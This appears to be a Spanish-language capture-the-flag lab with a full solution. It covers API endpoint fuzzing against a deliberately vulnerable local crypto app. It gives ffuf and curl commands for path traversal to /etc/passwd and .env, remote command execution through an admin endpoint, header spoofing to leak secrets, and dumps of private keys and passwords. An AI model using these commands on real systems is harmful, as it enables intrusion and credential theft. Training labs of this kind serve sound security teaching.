# LAB 13 - Endpoint Discovery (Directory & Path Fuzzing)

## Fase de la Metodologia: 3 - ENDPOINT FUZZING

---

## Objetivo

Aplicar la tercera fase del pentest de API: **descubrir endpoints individuales dentro de cada version y namespace** (`/api/v1/admin/*`, `/api/v1/internal/*`, `/api/v1/users/*`, etc.). Esta fase usa las pistas de Fase 1 (RECON) y Fase 2 (INVENTORY) para hacer fuzzing dirigido.

A diferencia de Fase 2 (que descubre **versiones**), Fase 3 descubre **rutas** dentro de una version conocida.

---

## Hallazgos esperados

| Endpoint nuevo | Auth | Que rompe |
|---|---|---|
| `GET /api/v1/admin/backup.php` | `?token=backup_static_2024` o magic flag | Dump SQL completo de la DB |
| `GET /api/v1/admin/logs.php?file=...` | magic flag | LFI clasica + lee logs |
| `POST /api/v1/admin/exec.php` | `X-Admin-Token: admin_dev_bypass_v1` o `Cookie: internal_user=admin` | RCE |
| `GET /api/v1/internal/health` | XFF interna o magic flag | Filtra DB_PASS, JWT_SECRET, todos los tokens |
| `GET /api/v1/wallets/private-keys.php` | magic flag | Dump de TODAS las private keys |
| `GET /api/v1/users/export.csv` | `?key=export_2024` o magic flag | CSV con `password_plain` y `password_hash` |
| `GET /api/v1/.git-rev` | sin auth | Filtra commit hash, branch y remote URL interna |

---

## Tecnicas

### 3.1 - Path bruteforcing

```bash
TARGET=http://localhost:8080
TOK=$(curl -s -X POST $TARGET/api/v1/auth/login.php \
        -H "Content-Type: application/json" \
        -d '{"username":"carlos","password":"carlos2024"}' | jq -r .token)

# Brute de paths bajo /api/v1/admin/
ffuf -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
     -u $TARGET/api/v1/admin/FUZZ.php \
     -mc 200,401,403 -t 30 \
     -H "Authorization: Bearer $TOK"

# Brute con extensiones (csv, json, xml)
ffuf -w SecLists/Discovery/Web-Content/api/objects.txt \
     -u $TARGET/api/v1/users/FUZZ \
     -e .csv,.json,.xml,.php \
     -mc 200,401 -t 30
```

### 3.2 - Verb fuzzing (HTTP method)

```bash
# Probar todos los metodos en un endpoint conocido
for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $V $TARGET/api/v1/admin/users.php \
        -H "Authorization: Bearer $TOK")
    echo "$V -> $STATUS"
done
```

### 3.3 - Recursivo

```bash
# feroxbuster baja recursivamente - util para namespaces
feroxbuster -u $TARGET/api/v1/ \
            -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
            -x php \
            -t 30 -d 3
```

### 3.4 - Combinar con pistas de Fase 1

Las notas internas (`notes.txt`, `TODO.md`) **listan endpoints concretos**. Sin Fase 1 el alumno tarda horas; con Fase 1 son segundos:

```bash
# Probar cada endpoint listado en notes.txt y TODO.md
for E in admin/backup.php admin/exec.php admin/logs.php internal/health \
         wallets/private-keys.php users/export.csv .git-rev; do
    echo "=== /api/v1/$E ==="
    curl -s -o /dev/null -w "%{http_code}\n" $TARGET/api/v1/$E
done
```

---

## Wordlists

```
SecLists/Discovery/Web-Content/api/api-endpoints.txt    (12k entradas)
SecLists/Discovery/Web-Content/api/objects.txt
SecLists/Discovery/Web-Content/api/actions.txt
SecLists/Discovery/Web-Content/raft-medium-words.txt
SecLists/Discovery/Web-Content/quickhits.txt
assetnote/wordlists/automated/php.txt
wordlists/cryptovulnx-endpoints.txt    (incluido)
```

---

## Pistas

<details>
<summary>Pista 1 - Fuzzing dirigido a admin/</summary>

```bash
ffuf -w wordlists/cryptovulnx-endpoints.txt \
     -u $TARGET/api/v1/admin/FUZZ \
     -e .php \
     -mc 200,401,403 -t 30
```

Hits esperados: `users.php` (existia), `transactions.php` (existia), `debug.php` (existia), `backup.php` (NUEVO), `exec.php` (NUEVO), `logs.php` (NUEVO).

</details>

<details>
<summary>Pista 2 - LFI en logs.php</summary>

```bash
# Path traversal hacia /etc/passwd
curl -s "$TARGET/api/v1/admin/logs.php?file=../../../../etc/passwd" \
     -H "X-Admin-Token: admin_dev_bypass_v1"

# O logs simulados
curl -s "$TARGET/api/v1/admin/logs.php?file=audit.log" \
     -H "X-Admin-Token: admin_dev_bypass_v1"

# Leer .env del docroot
curl -s "$TARGET/api/v1/admin/logs.php?file=/var/www/html/.env" \
     -H "X-Admin-Token: admin_dev_bypass_v1"
```

</details>

<details>
<summary>Pista 3 - Health endpoint con XFF spoofing</summary>

```bash
# Sin XFF - 403
curl -s $TARGET/api/v1/internal/health

# Con XFF interno - 200 + secrets
curl -s $TARGET/api/v1/internal/health \
     -H "X-Forwarded-For: 127.0.0.1" | jq
```

</details>

<details>
<summary>Pista 4 - .git-rev (path con punto)</summary>

```bash
# Curl debe respetar el punto en la URL
curl -s "$TARGET/api/v1/.git-rev"
```

Devuelve commit hash, branch, remote URL (`gitlab.cryptovulnx.internal`) y mensaje del ultimo commit.

</details>

<details>
<summary>Pista 5 - export.csv con extension custom</summary>

```bash
curl -s "$TARGET/api/v1/users/export.csv?key=export_2024" -o users.csv
head users.csv
```

</details>

---

## Solucion Resumida

```bash
TARGET=http://localhost:8080

# 1. Backup completo
curl -s "$TARGET/api/v1/admin/backup.php?token=backup_static_2024" \
     -o cryptovulnx_dump.sql && head -50 cryptovulnx_dump.sql

# 2. RCE via exec.php
curl -sX POST $TARGET/api/v1/admin/exec.php \
     -H "X-Admin-Token: admin_dev_bypass_v1" \
     -H "Content-Type: application/json" \
     -d '{"cmd":"cat /var/www/html/.env"}' | jq -r .output

# 3. LFI via logs.php
curl -s "$TARGET/api/v1/admin/logs.php?file=/etc/passwd" \
     -H "X-Admin-Token: admin_dev_bypass_v1"

# 4. Health con secrets
curl -s $TARGET/api/v1/internal/health \
     -H "X-Forwarded-For: 127.0.0.1" | jq '.tokens, .config'

# 5. Private keys de TODOS
curl -s $TARGET/api/v1/wallets/private-keys.php \
     -H "X-Admin-Token: admin_dev_bypass_v1" | jq '.wallets'

# 6. Export CSV
curl -s "$TARGET/api/v1/users/export.csv?key=export_2024"

# 7. Git rev (revela infra)
curl -s "$TARGET/api/v1/.git-rev" | jq
```

---

## Flags

```
FLAG-ENDPOINT-01  -> backup.php dump completo de DB
FLAG-ENDPOINT-02  -> logs.php LFI via ?file=
FLAG-ENDPOINT-03  -> exec.php RCE via X-Admin-Token
FLAG-ENDPOINT-04  -> internal/health filtra todos los tokens
FLAG-ENDPOINT-05  -> private-keys dump completo
FLAG-ENDPOINT-06  -> export.csv dump de usuarios
FLAG-ENDPOINT-07  -> .git-rev filtra commit y remote
```

---

## Como esto encadena con Fase 5 (Exploitation)

| Hallazgo | Habilita |
|---|---|
| RCE en `/api/v1/admin/exec.php` | LAB05 BFLA, LAB08 Misconfig |
| LFI en `/api/v1/admin/logs.php` | Lectura de `/var/www/html/.env`, `/etc/passwd`, `database.php` |
| Backup completo | Pasar a offline cracking de hashes, robar private keys |
| Health endpoint | Pivotar a otros endpoints internos con tokens reales |
| `git-rev` con remote | Acceso al GitLab interno (no presente en lab, pero pista para post-explotacion) |
